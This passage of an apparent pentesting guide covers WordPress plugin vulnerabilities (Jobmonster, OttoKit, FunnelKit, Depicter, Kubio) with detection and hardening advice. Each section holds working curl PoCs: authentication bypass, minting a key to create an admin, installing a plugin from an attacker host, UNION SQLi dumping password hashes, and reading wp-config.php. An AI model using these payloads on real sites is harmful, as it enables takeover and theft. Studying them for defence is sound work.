}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
なぜ悪用可能か

- admin-ajax.php 経由で認証なしで到達可能（wp_ajax_nopriv_… action）。
- nonce/capability チェックが状態変更前に行われていない。
- OAuth/OpenID プロバイダ検証が欠如しており、デフォルトの分岐が攻撃者の入力を受け入れてしまう。
- get_user_by('email', $_POST['id']) の後に wp_set_auth_cookie($uid) が呼ばれ、要求者を任意の既存のメールアドレスとして認証してしまう。

Exploitation (unauthenticated)

- 前提条件：攻撃者が /wp-admin/admin-ajax.php に到達でき、有効なユーザーメールを知っているか推測できること。
- provider をサポートされていない値に設定する（または省略する）ことでデフォルトの分岐に入り、id=<victim_email> を渡す。
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* for the victim user; subsequent requests are authenticated.

Finding the action name

- テーマやプラグイン内で add_action('wp_ajax_nopriv_...', '...') の登録をソーシャルログインのコード（例: framework/add-ons/social-login/class-social-login.php）で確認する。
- AJAX ハンドラ内で wp_set_auth_cookie(), get_user_by('email', ...) を grep する。

Detection checklist

- Web ログに、social-login アクションと id=<email> を含む /wp-admin/admin-ajax.php への未認証の POST が記録されていること。
- 同一の IP/User-Agent からの認証済みトラフィックに先立ち、success JSON を含む 200 レスポンスがあること。

Hardening

- クライアント入力から識別情報を派生させない。検証済みプロバイダの token/ID に由来する email/ID のみを受け入れる。
- ログイン補助でも CSRF nonces と capability checks を要求する。wp_ajax_nopriv_ は厳密に必要な場合以外登録しない。
- OAuth/OIDC レスポンスをサーバ側で検証し、プロバイダが欠落または無効な場合は拒否する（POST id にフォールバックしない）。
- 修正されるまで、ソーシャルログインを一時的に無効化するか、エッジで仮想パッチ（脆弱なアクションをブロック）することを検討する。

Patched behaviour (Jobmonster 4.8.0)

- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers ≤ 1.0.82)

Some plugins expose REST endpoints that mint reusable “connection keys” or tokens without verifying the caller’s capabilities. If the route authenticates only on a guessable attribute (e.g., username) and does not bind the key to a user/session with capability checks, any unauthenticated attacker can mint a key and invoke privileged actions (admin account creation, plugin actions → RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC – mint a connection key and use it
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# → {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Why it’s exploitable
- Sensitive REST route protected only by low-entropy identity proof (username) or missing permission_callback
- No capability enforcement; minted key is accepted as a universal bypass

Detection checklist
- プラグインコードを grep して register_rest_route(..., [ 'permission_callback' => '__return_true' ]) を探す
- リクエスト提供の識別情報（username/email）に基づいてトークン/キーを発行し、認証済みユーザーや capability に紐付けていないルート
- サーバー側の capability チェックなしに発行済みトークン/キーを受け入れる後続ルートを探す

Hardening
- 特権を持つ REST ルートでは、必要な capability に対して current_user_can() を強制する permission_callback を要求する
- クライアント提供の識別情報から長寿命キーを発行しない。必要な場合は、認証後に短寿命かつユーザーに紐づいたトークンを発行し、使用時に capability を再確認する
- 呼び出し元のユーザーコンテキストを検証する（wp_set_current_user は単独では不十分）および !is_user_logged_in() || !current_user_can(<cap>) の場合はリクエストを拒否する

---

## Nonce gate misuse → 認証されていない任意のプラグインインストール (FunnelKit Automations ≤ 3.5.3)

Nonces は CSRF を防ぐものであり、認可を意味するものではない。コードが nonce の通過を安全の合図とみなして特権操作（例: install/activate plugins）の capability チェックをスキップすると、認証されていない攻撃者が弱い nonce 要件を満たしてバックドア入りや脆弱なプラグインをインストールすることで RCE に到達し得る。

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce “passes”
- Impact: full compromise via arbitrary plugin install/activation

PoC (shape depends on plugin; illustrative only)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
検出チェックリスト
- wp_verify_nonce()/check_admin_referer() のみで権限チェックがない、プラグイン/テーマを変更する REST/AJAX ハンドラ
- nonce 検証後に $skip_caps = true を設定する任意のコードパス

Hardening
- nonces は常に CSRF トークンとしてのみ扱う；nonce の状態に関係なく権限チェックを強制する
- installer code に到達する前に current_user_can('install_plugins') と current_user_can('activate_plugins') を要求する
- 未認証アクセスを拒否する；特権フローに対して nopriv AJAX actions を公開しない

---

## depicter-* actions の s (search) パラメータ経由の認証不要の SQLi (Depicter Slider ≤ 3.6.1)

複数の depicter-* アクションが s (search) パラメータを受け取り、パラメータ化なしで SQL クエリに連結していた。

- Parameter: s (search)
- Flaw: WHERE/LIKE 句での直接文字列連結；prepared statements/サニタイズなし
- Impact: database exfiltration (users, hashes), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Detection checklist
- Grep for depicter-* action handlers and direct use of $_GET['s'] or $_POST['s'] in SQL
- $wpdb->get_results()/query() に渡されるカスタムクエリで s を連結している箇所を確認

Hardening
- 常に $wpdb->prepare() または wpdb プレースホルダを使用し、サーバー側で予期しないメタ文字を拒否する
- s に対して厳密な許可リストを追加し、期待される文字セット／長さに正規化する

---

## 認証不要の Local File Inclusion via unvalidated template/file path (Kubio AI Page Builder ≤ 2.5.1)

テンプレートパラメータで攻撃者制御のパスを正規化／制限せずに受け入れると、任意のローカルファイルの読み取りを許し、includable な PHP やログファイルが実行時に取り込まれる場合はコード実行が発生することがある。

- パラメータ: __kubio-site-edit-iframe-classic-template
- 脆弱性: 正規化／許可リストがなく、パス・トラバーサルが可能
- 影響: 秘密情報の漏洩 (wp-config.php)、特定の環境では RCE の可能性 (log poisoning、includable PHP)

PoC – wp-config.php を読み取る
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
検出チェックリスト
- realpath() による包含チェックを行わずにリクエストパスを include()/require()/read シンクに連結するハンドラーがないか確認する
- 意図した templates ディレクトリの外に到達する traversal パターン (../) を探す

ハードニング
- 許可リスト化されたテンプレートを強制する。realpath() で解決し、str_starts_with(realpath(file), realpath(allowed_base)) を要求する
- 入力を正規化する。traversal シーケンスと絶対パスを拒否する。sanitize_file_name() はファイル名（フルパスではなく）にのみ使用する


## References

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation – Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025’s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) ≤ 1.0.82 – Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations ≤ 3.5.3 – Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider ≤ 3.6.1 – Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder ≤ 2.5.1 – Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
